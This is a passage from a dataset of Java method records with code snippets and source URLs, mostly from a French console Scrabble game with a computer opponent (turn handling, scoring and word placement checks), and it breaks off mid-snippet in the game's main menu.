["public"]}}, {"id": 56628, "method_name": "configure", "class_name": "AzkabanCoreModule", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "  protected void configure() {\n    bind(Props.class).toInstance(this.props);\n    bind(MetricRegistry.class).in(Scopes.SINGLETON);\n  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/az-core/src/main/java/azkaban/AzkabanCoreModule.java", "stars": "18", "class_props": {"extends": "AbstractModule", "implements": null, "modifiers": ["public"]}}, {"id": 56629, "method_name": "montrerTableauMultijoueur", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void montrerTableauMultijoueur() {\n\t\tplat.montrerPlateau();\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56630, "method_name": "montrerMainMultijoueur", "class_name": "MatchIA", "params": ["Joueur"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void montrerMainMultijoueur(Joueur nomJoueur) {\n\t\tSystem.out.print(\"  { \");\n\t\tfor (int i = 0; i < 6; ++i)\n\t\t\tSystem.out.print(nomJoueur.verifierLettre(i) + \", \");\n\t\tSystem.out.print(nomJoueur.verifierLettre(6) + \" }\\n\");\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56631, "method_name": "tourActuel", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Joueur", "snippet": "\tpublic Joueur tourActuel() {\n\t\tif (joueur.verifierTour() == true)\n\t\t\treturn joueur;\n\t\telse\n\t\t\treturn ordi;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56632, "method_name": "adversaireActuel", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Joueur", "snippet": "\tpublic Joueur adversaireActuel() {\n\t\tif (joueur.verifierTour() == true)\n\t\t\treturn ordi;\n\t\telse\n\t\t\treturn joueur;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56633, "method_name": "isPlayerTurn", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isPlayerTurn() {\n\t\treturn joueur.verifierTour();\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56634, "method_name": "asGagne", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean asGagne() { // test pour savoir si un joueur n'a plus de lettres a placer.\n\t\tfor (int i = 0; i < 7; i++) {\n\t\t\tif (tourActuel().verifierLettre(i) != 0)\n\t\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56635, "method_name": "totalUsedWords", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int totalUsedWords() {\n\t\treturn usedWords.size();\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56636, "method_name": "lettresRestant", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int lettresRestant() {\n\t\treturn getNombreLettre().size();\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56637, "method_name": "isWordUsed", "class_name": "MatchIA", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isWordUsed(String value) {\n\t\treturn usedWords.contains(value);\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56638, "method_name": "newWordUsed", "class_name": "MatchIA", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void newWordUsed(String value) {\n\t\tusedWords.add(value);\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56639, "method_name": "suivantTour", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void suivantTour() {\n\t\tif (tourActuel().verifierNom() == joueur.verifierNom()) {\n\t\t\tjoueur.terminerTour();\n\t\t\tordi.commencerTour();\n\t\t} else {\n\t\t\tordi.terminerTour();\n\t\t\tjoueur.commencerTour();\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56640, "method_name": "pointsFin", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Joueur", "snippet": "\tpublic Joueur pointsFin() {\n\t\tif (tourActuel().verifierTourPasser() && adversaireActuel().verifierTourPasser()) {\n\t\t\t// La partie est termin\u00e9 car il n'y a pas plus de lettres pour les deux personnes.\n\t\t\t// Juste comparer qui a plus de points\n\t\t\tif (tourActuel().verifierScore() == adversaireActuel().verifierScore()) {\n\t\t\t\tJoueur gagner = new Joueur(\"Match Null\", getNombreLettre());\n\t\t\t\treturn gagner;\n\t\t\t} else {\n\t\t\t\tif (tourActuel().verifierScore() > adversaireActuel().verifierScore())\n\t\t\t\t\treturn tourActuel();\n\t\t\t\telse\n\t\t\t\t\treturn adversaireActuel();\n\t\t\t}\n\n\t\t} else {\n\t\t\t// si la partie est terminee alors le joueur qui viens d'utiliser toutes ces\n\t\t\t// lettres restantes doit ce voir ajouter a son score la somme des lettres\n\t\t\t// restantes a son adversaires.\n\t\t\tint points = 0;\n\t\t\tint[] scoreLettre = { 1, 3, 3, 2, 1, 4, 2, 4, 1, 8, 10, 1, 2, 1, 1, 3, 8, 1, 1, 1, 1, 4, 10, 10, 10, 10,\n\t\t\t\t\t0 };\n\n\t\t\t// le joueur actuel qui a fini la partie donc on calcule la somme des lettres\n\t\t\t// restante du joueur adversaire.\n\t\t\tfor (int i = 0; i < 7; ++i) {\n\t\t\t\tif (adversaireActuel().verifierLettre(i) >= 97)\n\t\t\t\t\tpoints += scoreLettre[adversaireActuel().verifierLettre(i) - 97];\n\t\t\t}\n\n\t\t\t// actualise le nouveau scores des deux joueurs\n\t\t\ttourActuel().nouveauScore(tourActuel().verifierScore() + points);\n\t\t\t// Il y a deux types de points pour l'adversaire!!!!\n\t\t\t// Adversaire Actuel avec points negatif\n\t\t\tadversaireActuel().nouveauScore(adversaireActuel().verifierScore() - points);\n\t\t\t// Adversaire Actuel avec min valeur 0\n\t\t\t// int scoreAdversaire = (adversaireActuel().verifierScore() - points >= 0) ?\n\t\t\t// adversaireActuel().verifierScore() - points : 0 ;\n\t\t\t// adversaireActuel().nouveauScore(scoreAdversaire);\n\n\t\t\tif (tourActuel().verifierScore() == adversaireActuel().verifierScore()) {\n\t\t\t\tJoueur gagner = new Joueur(\"Match Null\", getNombreLettre());\n\t\t\t\treturn gagner;\n\t\t\t} else {\n\t\t\t\tif (tourActuel().verifierScore() > adversaireActuel().verifierScore())\n\t\t\t\t\treturn tourActuel();\n\t\t\t\telse\n\t\t\t\t\treturn adversaireActuel();\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56641, "method_name": "getBestMove", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Mot", "snippet": "\tpublic Mot getBestMove() { // retourne le mot devant \u00eatre saisi par l'ia (d\u00e9pend de la difficult\u00e9 choisie)\n\t\tpermutationSearch pSResult = new permutationSearch(dicoAnagram, dico, plat, ordi.verifierMain(), this.usedWords);\n\t\tMot retVal = null;\n\n\t\tif (pSResult.totalPossibleWords() == 0)\n\t\t\treturn retVal;\n\n\t\tArrayList<Mot> threeWordList = new ArrayList<Mot>();\n\t\tfor (int index = 0; index < pSResult.totalPossibleWords(); ++index){\n\t\t\tif(pSResult.possibleWord(index).verifierNom().length() >= 3)\n\t\t\t\tthreeWordList.add(pSResult.possibleWord(index));\n\t\t}\n\n\t\tif(threeWordList.size() == 0){\n\t\t\treturn retVal;\n\t\t}\n\n\t\tswitch (difficulte) {\n\t\tcase 1:\n\t\t\t// Facile\n\t\t\t// Seulement choisir le mot qui donne le moins de points\n\t\t\tretVal = threeWordList.get(threeWordList.size() - 1);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\t// Normale\n\t\t\t// choisir le mots qui est au milieu\n\t\t\tretVal = threeWordList.get(Math.floorDiv(threeWordList.size() - 1, 2));\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\t// Difficile\n\t\t\t// La premier mot de la liste sera celui qui rapporte le plus de points de tout\n\t\t\t// les possibilites\n\t\t\tretVal = threeWordList.get(0);\n\t\t\tbreak;\n\t\t}\n\n\t\treturn retVal;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56642, "method_name": "completeIATurn", "class_name": "MatchIA", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int completeIATurn() {\n\t\tMot motASaisir = getBestMove();\n\t\tif (motASaisir != null) {\n\t\t\t// ins\u00e9rer un mot dans le tableau\n\t\t\tproceedWithAction(ordi, motASaisir.getLettres(), motASaisir.verifierX(), motASaisir.verifierY(),\n\t\t\t\t\tmotASaisir.verifierHorizontal());\n\t\t\treturn 0;\n\t\t} else {\n\t\t\t// si ce n'est pas le cas on regarde combien de lettres il reste dans la pioche\n\t\t\tif (lettresRestant() > 0) { // si il reste des lettres dans la pioche on decide de jeter nos lettres\n\t\t\t\tfor (int i = 0; i < ordi.verifierMain().length; i++)\n\t\t\t\t\tsetNombreLettre(ordi.jeterLettre(i, getNombreLettre()));\n\n\t\t\t\treturn -1;\n\t\t\t} else // Juste un autre tour qu'il ne peut rien faire, v\u00e9rifiez si l'autre joueur ne peut pas aussi gagner ou donner un autre tour sans se d\u00e9placer\n\t\t\tif (tourActuel().verifierTourPasser() && adversaireActuel().verifierTourPasser()) {\n\t\t\t\t// Il n'y a plus de lettres et les deux joueurs n'ont rien \u00e0 jouer\n\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t=== There aren't more combinations available!!! ===\");\n\t\t\t\tif (tourActuel().verifierScore() == adversaireActuel().verifierScore()) {\n\t\t\t\t\t// La partie s'est termin\u00e9e par une \u00e9galit\u00e9 (les deux joueurs ont le m\u00eame nombre de points)\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t === MATCH NULL ===\");\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\tSystem.out\n\t\t\t\t\t\t\t.print(\"\\n\\t\\tJoueur \" + joueur.verifierNom() + \": \" + joueur.verifierScore() + \" points!\");\n\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + ordi.verifierNom() + \": \" + ordi.verifierScore() + \" points!\");\n\t\t\t\t} else {\n\t\t\t\t\tJoueur gagnant = (tourActuel().verifierScore() > adversaireActuel().verifierScore()) ? tourActuel()\n\t\t\t\t\t\t\t: adversaireActuel();\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t=== Le gagnant est \" + gagnant.verifierNom() + \"!!! ===\");\n\t\t\t\t\tSystem.out.print(\"\\n\\n\\t\\t   Classement final!!\");\n\t\t\t\t\tSystem.out\n\t\t\t\t\t\t\t.print(\"\\n\\t\\tJoueur \" + joueur.verifierNom() + \": \" + joueur.verifierScore() + \" points!\");\n\t\t\t\t\tSystem.out.print(\"\\n\\t\\tJoueur \" + ordi.verifierNom() + \": \" + ordi.verifierScore() + \" points!\");\n\t\t\t\t}\n\t\t\t\t// D\u00e9clare la fin du jeu\n\t\t\t\treturn 1;\n\t\t\t} else {\n\t\t\t\t// Le jeu n'a pas pris fin pour le moment, passez au tour suivant\n\t\t\t\tordi.incrementTourPasser();\n\t\t\t\treturn -2;\n\t\t\t}\n\t\t}\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56643, "method_name": "proceedWithAction", "class_name": "MatchIA", "params": ["Joueur", "int", "int", "int", "Boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean proceedWithAction(Joueur nomJoueur, int[] mot, int xPos, int yPos, Boolean horizontal) {\n\n\t\t// Si ce n'est pas au tour du joueur actuel, ne le laisse rien faire\n\t\tif (tourActuel() != nomJoueur)\n\t\t\treturn false;\n\n\t\t// Nombre de combination trouve\n\t\tint combinations = 0;\n\n\t\tif (plat.returnBoite(7, 7) == 3 && horizontal) {\n\t\t\t// this is the first turn of the game\n\t\t\tif(xPos == 7) {\n\t\t\t\tif(yPos > 7 || (yPos + mot.length) < 7 )\n\t\t\t\t\treturn false;\n\t\t\t} else\n\t\t\t\treturn false;\n\t\t}\n\n\t\tif (plat.returnBoite(7, 7) == 3 && !horizontal) {\n\t\t\tif(yPos == 7) {\n\t\t\t\tif(xPos > 7 || (xPos + mot.length) < 7 )\n\t\t\t\t\treturn false;\n\t\t\t} else\n\t\t\t\treturn false;\n\t\t}\n\n\n\t\t// v\u00e9rifier qu'il n'y a pas de majuscule\n\t\tfor (int i = 0; i < mot.length; ++i) {\n\t\t\tif ((65 <= mot[i]) && (mot[i] <= 90))\n\t\t\t\tmot[i] += 32;\n\t\t}\n\n\t\tif (horizontal) {\n\t\t\t// V\u00e9rifie primordialement dans l'ordre vertical chacune des lettres et \u00e0 la fin\n\t\t\t// il v\u00e9rifie chaque extr\u00eame avec ses voisins horizontaux\n\t\t\tint topX = 0;\n\t\t\tint subX = 0;\n\t\t\tint letterCount = 0;\n\n\t\t\tfor (int i = yPos; i < (yPos + mot.length); ++i) {\n\t\t\t\tletterCount = 1;\n\t\t\t\t// Il commence \u00e0 se d\u00e9placer vers la droite \u00e0 partir du placement de la premi\u00e8re\n\t\t\t\t// lettre\n\t\t\t\t// Je v\u00e9rifie au-dessus de la ligne de lettres\n\n\t\t\t\tif(plat.returnBoite(xPos, i) <= 6) {\n\t\t\t\t\tsubX = xPos;\n\t\t\t\t\twhile (plat.returnBoite(subX - 1, i) >= 5) {\n\t\t\t\t\t\tletterCount++;\n\t\t\t\t\t\tsubX--;\n\t\t\t\t\t}\n\n\t\t\t\t\t// Je v\u00e9rifie sous la ligne de lettres\n\t\t\t\t\ttopX = xPos;\n\t\t\t\t\twhile (plat.returnBoite(topX + 1, i) >= 5) {\n\t\t\t\t\t\tletterCount++;\n\t\t\t\t\t\ttopX++;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\t// La lettre initiale est compt\u00e9e deux fois, donc le compteur doit avoir une\n\t\t\t\t// valeur sup\u00e9rieure \u00e0 2 pour \u00eatre admis\n\t\t\t\tif (letterCount >= 2) {\n\n\t\t\t\t\t// Une s\u00e9quence de lettres a \u00e9t\u00e9 trouv\u00e9e, elle doit \u00eatre calcul\u00e9e s'il s'agit\n\t\t\t\t\t// d'un mot reconnaissable\n\t\t\t\t\tString possibleMot = \"\";\n\t\t\t\t\tfor (int j = subX; j <= topX; ++j) { //\n\t\t\t\t\t\tif (j == xPos)\n\t\t\t\t\t\t\tpossibleMot += Character.toString((char) mot[i - yPos]);\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tpossibleMot += Character.toString((char) plat.returnBoite(j, i));\n\t\t\t\t\t}\n\n\t\t\t\t\tif (dico.contains('\"' + possibleMot + '\"') && !isWordUsed(possibleMot)) {\n\n\t\t\t\t\t\t// Le mot trouv\u00e9 a \u00e9t\u00e9 reconnu dans le dictionnaire !!!!!\n\n\t\t\t\t\t\tnewWordUsed(possibleMot);\n\t\t\t\t\t\tnomJoueur.nouveauScore(\n\t\t\t\t\t\t\t\tnomJoueur.verifierScore() + nomJoueur.calculerScore(mot, subX, yPos, false, plat));\n\t\t\t\t\t\tcombinations++;\n\t\t\t\t\t} else {\n\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Fin des r\u00e9visions verticales, il est maintenant temps de r\u00e9viser horizontalement\n\t\t\tint subY = yPos;\n\t\t\tint topY = yPos + mot.length - 1;\n\t\t\tletterCount = mot.length;\n\n\t\t\t// Je v\u00e9rifie \u00e0 gauche du premier \u00e9l\u00e9ment de la ligne de lettres\n\t\t\twhile (((int) plat.returnBoite(xPos, subY - 1) >= 5)) {\n\t\t\t\tletterCount++;\n\t\t\t\tsubY--;\n\t\t\t}\n\n\t\t\t// Je v\u00e9rifie \u00e0 droite de la ligne de lettres\n\t\t\twhile (((int) plat.returnBoite(xPos, topY + 1) >= 5)) {\n\t\t\t\tletterCount++;\n\t\t\t\ttopY++;\n\t\t\t}\n\n\n\t\t\t// Encore une fois, la lettre initiale est compt\u00e9e deux fois, donc le compteur\n\t\t\t// doit avoir une valeur sup\u00e9rieure \u00e0 2 pour \u00eatre admis\n\t\t\tif (letterCount > 2) {\n\n\t\t\t\t// Une s\u00e9quence de lettres a \u00e9t\u00e9 trouv\u00e9e, elle doit \u00eatre calcul\u00e9e s'il s'agit\n\t\t\t\t// d'un mot reconnaissable\n\t\t\t\tString possibleMot = \"\";\n\t\t\t\tBoolean usedPlateau = false;\n\t\t\t\tfor (int i = subY; i <= topY; ++i) { //\n\t\t\t\t\tif (plat.returnBoite(xPos, i) < 5 && plat.returnBoite(xPos, i) >= 0)\n\t\t\t\t\t\tpossibleMot += Character.toString((char) mot[i - yPos]);\n\t\t\t\t\telse {\n\t\t\t\t\t\tpossibleMot += Character.toString((char) plat.returnBoite(xPos, i));\n\t\t\t\t\t\tusedPlateau = true;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (plat.returnBoite(7, 7) != 3 && usedPlateau == false)\n\t\t\t\t\treturn false;\n\n\t\t\t\tif (dico.contains('\"' + possibleMot + '\"') && !isWordUsed(possibleMot)) {\n\n\t\t\t\t\t// Le mot trouv\u00e9 a \u00e9t\u00e9 reconnu dans le dictionnaire !!!!!\n\t\t\t\t\tnewWordUsed(possibleMot);\n\t\t\t\t\tnomJoueur.nouveauScore(\n\t\t\t\t\t\t\tnomJoueur.verifierScore() + nomJoueur.calculerScore(mot, xPos, subY, true, plat));\n\t\t\t\t\tcombinations++;\n\t\t\t\t} else {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\treturn false;\n\t\t\t}\n\n\t\t} else {\n\t\t\t// V\u00e9rifie principalement dans l'ordre horizontal chacune des lettres et \u00e0 la\n\t\t\t// fin il v\u00e9rifie chaque extr\u00eame avec ses voisins verticaux\n\n\n\t\t\tint subY = yPos;\n\t\t\tint topY = yPos + mot.length - 1;\n\t\t\tint letterCount = mot.length;\n\n\t\t\tfor (int i = xPos; i < (xPos + mot.length); ++i) {\n\t\t\t\tletterCount = 1;\n\n\t\t\t\t// Commence \u00e0 descendre du placement de la premi\u00e8re lettre\n\t\t\t\tsubY = yPos;\n\n\t\t\t\t// Si le mot a d\u00e9j\u00e0 \u00e9t\u00e9 plac\u00e9, ne v\u00e9rifiez pas s'il cr\u00e9e un mot dans l'autre sens car il sera \u00e9videmment li\u00e9 \u00e0 un mot d\u00e9j\u00e0 cr\u00e9\u00e9\n\t\t\t\tif(plat.returnBoite(i, yPos) <= 6) {\n\t\t\t\t\t// Je v\u00e9rifie \u00e0 gauche du premier \u00e9l\u00e9ment de la ligne de lettres\n\t\t\t\t\twhile (plat.returnBoite(i, subY - 1) >= 5) {\n\t\t\t\t\t\tletterCount++;\n\t\t\t\t\t\tsubY--;\n\t\t\t\t\t}\n\n\t\t\t\t\ttopY = yPos;\n\t\t\t\t\t// Je v\u00e9rifie \u00e0 droite du m\u00eame \u00e9l\u00e9ment dans la rang\u00e9e de lettres\n\t\t\t\t\twhile (plat.returnBoite(i, topY + 1) >= 5) {\n\t\t\t\t\t\tletterCount++;\n\t\t\t\t\t\ttopY++;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\n\t\t\t\t// Encore une fois, la lettre initiale est compt\u00e9e deux fois, donc le compteur\n\t\t\t\t// doit avoir une valeur sup\u00e9rieure \u00e0 2 pour \u00eatre admis\n\t\t\t\tif (letterCount >= 2) {\n\n\t\t\t\t\t// Une s\u00e9quence de lettres a \u00e9t\u00e9 trouv\u00e9e, elle doit \u00eatre calcul\u00e9e s'il s'agit\n\t\t\t\t\t// d'un mot reconnaissable\n\t\t\t\t\tString possibleMot = \"\";\n\t\t\t\t\tfor (int j = subY; j <= topY; ++j) { //\n\t\t\t\t\t\tif (j == yPos)\n\t\t\t\t\t\t\tpossibleMot += Character.toString((char) mot[i - xPos]);\n\t\t\t\t\t\telse\n\t\t\t\t\t\t\tpossibleMot += Character.toString((char) plat.returnBoite(i, j));\n\t\t\t\t\t}\n\n\t\t\t\t\tif (dico.contains('\"' + possibleMot + '\"') && !isWordUsed(possibleMot)) {\n\t\t\t\t\t\t// Le mot trouv\u00e9 a \u00e9t\u00e9 reconnu dans le dictionnaire !!!!!\n\n\t\t\t\t\t\tnewWordUsed(possibleMot);\n\t\t\t\t\t\tnomJoueur.nouveauScore(\n\t\t\t\t\t\t\t\tnomJoueur.verifierScore() + nomJoueur.calculerScore(mot, xPos, subY, true, plat));\n\t\t\t\t\t\tcombinations++;\n\t\t\t\t\t} else {\n\t\t\t\t\t\treturn false;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Fin des r\u00e9visions horizontalement, il est maintenant temps de r\u00e9viser\n\t\t\t// verticalement\n\t\t\tint subX = xPos;\n\t\t\tint topX = xPos + mot.length - 1;\n\t\t\tletterCount = mot.length;\n\n\t\t\t// Je v\u00e9rifie au-dessus du premier \u00e9l\u00e9ment de la ligne de lettres\n\t\t\twhile (plat.returnBoite(subX - 1, yPos) >= 5) {\n\t\t\t\tletterCount++;\n\t\t\t\tsubX--;\n\t\t\t}\n\n\t\t\t// Je v\u00e9rifie sous la ligne de lettres\n\t\t\twhile (plat.returnBoite(topX + 1, yPos) >= 5) {\n\t\t\t\tletterCount++;\n\t\t\t\ttopX++;\n\t\t\t}\n\n\t\t\t// Encore une fois, la lettre initiale est compt\u00e9e deux fois, donc le compteur\n\t\t\t// doit avoir une valeur sup\u00e9rieure \u00e0 2 pour \u00eatre admis\n\t\t\tif (letterCount > 2) {\n\t\t\t\t//System.out.println(\"Entr\u00e9 car il y a 3 lettres ou plus\");\n\n\t\t\t\t// Une s\u00e9quence de lettres a \u00e9t\u00e9 trouv\u00e9e, elle doit \u00eatre calcul\u00e9e s'il s'agit\n\t\t\t\t// d'un mot reconnaissable\n\t\t\t\tString possibleMot = \"\";\n\t\t\t\tBoolean usedPlateau = false;\n\t\t\t\tfor (int i = subX; i <= topX; ++i) { //\n\t\t\t\t\tif (plat.returnBoite(i, yPos) < 5 && plat.returnBoite(i, yPos) >= 0) {\n\t\t\t\t\t\tpossibleMot += Character.toString((char) mot[i - xPos]);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tpossibleMot += Character.toString((char) plat.returnBoite(i, yPos));\n\t\t\t\t\t\tusedPlateau = true;\n\t\t\t\t\t}\n\t\t\t\t}\n\n\t\t\t\tif (plat.returnBoite(7, 7) != 3 && usedPlateau == false)\n\t\t\t\t\treturn false;\n\n\t\t\t\tif (dico.contains('\"' + possibleMot + '\"') && !isWordUsed(possibleMot)) {\n\t\t\t\t\t// Le mot trouv\u00e9 a \u00e9t\u00e9 reconnu dans le dictionnaire !!!!!\n\n\t\t\t\t\tnewWordUsed(possibleMot);\n\t\t\t\t\tnomJoueur.nouveauScore(\n\t\t\t\t\t\t\tnomJoueur.verifierScore() + nomJoueur.calculerScore(mot, subX, yPos, false, plat));\n\t\t\t\t\tcombinations++;\n\t\t\t\t} else {\n\t\t\t\t\treturn false;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\treturn false;\n\t\t\t}\n\t\t}\n\n\t\t// Si il y a quelque combination de mot trouv\u00ef\u00bf\u00bd, supprimer les lettres\n\t\t// utilises.\n\t\tif (combinations > 0) {\n\t\t\t// Supprimer les lettres de la main (sans compter les lettres que sont deja sur\n\t\t\t// le table pour former la mot) et\n\t\t\t// mettre de nouvelle lettre tirer au hazard parmis celle encore disponible\n\n\t\t\t// mot: C'est le mot qui est forme sur le Plateau\n\t\t\t// main: C'est la main avec toutes les lettres a ta disposition.\n\t\t\tint j; // index pour trouver la position de la lettre selectione (mot[i]) dans la main\n\t\t\tBoolean trouve; // Boolean qui stope si le lettre est trouv\u00ef\u00bf\u00bd\n\t\t\tfor (int i = 0; i < mot.length; ++i) {\n\n\t\t\t\tif (!(mot[i] == plat.returnBoite(xPos, yPos + i) && horizontal)\n\t\t\t\t\t\t&& !(mot[i] == plat.returnBoite(xPos + i, yPos) && !horizontal)) {\n\t\t\t\t\t// Lettre c'est ne pas deja pose d'avant\n\t\t\t\t\t// trouve le lettre dans notre main et echanger\n\n\t\t\t\t\tj = 0; // On doit trouver une AUTRE lettre dans notre main, donc on restart index et Boolean\n\t\t\t\t\ttrouve = false;\n\t\t\t\t\twhile (j < 7 && !trouve) { // recherche un a un sur la main jusqu'a que la lettre soit trouv\u00ef\u00bf\u00bd dans la main ....\n\t\t\t\t\t\tif (mot[i] == nomJoueur.verifierLettre(j)) { // si la lettre que je suis maintenant est la  lettre chercher\n\t\t\t\t\t\t\tthis.setNombreLettre(nomJoueur.echangerLettre(j, getNombreLettre()));\n\t\t\t\t\t\t\ttrouve = true; // pour \u00ef\u00bf\u00bdviter la boucle infini, clore cette recherche\n\t\t\t\t\t\t} else\n\t\t\t\t\t\t\tj++; // Je n'ai pas trouve, on passe a l'index suivant\n\t\t\t\t\t} // Fin de la recherche pour la lettre utiliser\n\t\t\t\t}\n\n\t\t\t} // Fin de la recherche de toute les lettres utiliser\n\n\t\t\t// Inserter mot dans le Plateau\n\t\t\tplat.modifierPlateau(mot, xPos, yPos, horizontal);\n\n\t\t\treturn true;\n\t\t}\n\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/Ethpera/ScrabbleJava/master/src/MatchIA.java", "stars": "4", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 56644, "method_name": "main", "class_name": "MatchIA", "params": ["String"], "throws": ["IOException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) throws IOException {\n\t\tScanner scanner = new Scanner(System.in);\n\t\tSystem.out.print(\"\\n\\n\\n === EXEMPLE D'UNE GAME EN MODE VS ORDINATEUR === \\n\");\n\t\tSystem.out.print(\"\\n\\n\\tEntr\u00e9e vos pseudo!\");\n\t\tSystem.out.print(\"\\n\\tNom du Joueur: \");\n\t\tString premiereJoueur = scanner.nextLine();\n\t\tSystem.out.print(\"\\n\\tQuelle difficult\u00e9 ?\");\n\t\tSystem.out.print(\"\\n\\t1: Gentil\");\n\t\tSystem.out.print(\"\\n\\t2: Normal\");\n\t\tSystem.out.print(\"\\n\\t3: Sans piti\u00e9\");\n\t\tSystem.out.print(\"\\n\\n\\tQuelle option choisi tu ?: \");\n\t\tint difficulte = Integer.parseInt(scanner.nextLine());\n\t\tMatchIA gameInstance = new MatchIA(premiereJoueur, difficulte); // A MODIFIER\n\n\t\tint iterations = 0;\n\t\tint choice = -1;\n\n\t\tdo {\n\t\t\tSystem.out.print(\"\\n\\n\\t\\t == Game Menu ==\\n\\n\");\n\n\t\t\tSystem.out.print(\"\\n\\t Tour actuel: \" + gameInstance.tourActuel().verifierNom() + \"\\n\\n\");\n\t\t\tgameInstance.montrerTableauMultijoueur();\n\n\t\t\tif (gameInstance.isPlayerTurn()) {\n\n\t\t\t\tSystem.out.print(\"\\n\\n\\tStatut de la main du joueur\");\n\t\t\t\tgameInstance.montrerMainMultijoueur(gameInstance.tourActuel());\n\n\t\t\t\tSystem.out.print(\"\\n\\n\\tOption 1: Mettre un mot sur le plateau\");\n\t\t\t\tSystem.out.print(\"\\n\\tOption 2: Jetter des lettres\");\n\t\t\t\tSystem.out.print(\"\\n\\tOption 3: Passer mon tour\");\n\t\t\t\tSystem.out.print(\"\\n\\tOption 4: Suggestion Mots\");\n\n\t\t\t\tSystem.out.print(\"\\n\\n\\tQuelle option choisi tu ?: \");\n\t\t\t\tchoice = Integer.parseInt(scanner.nextLine());\n\t\t\t\tswitch (choice) {\n\t\t\t\tcase 1: // Jouer avec les mots dispo\n\t\t\t\t\tSystem.out.print(\"\\n\\nQuel mot veux-tu form\u00e9 ?: \");\n\t\t\t\t\tString readWord = 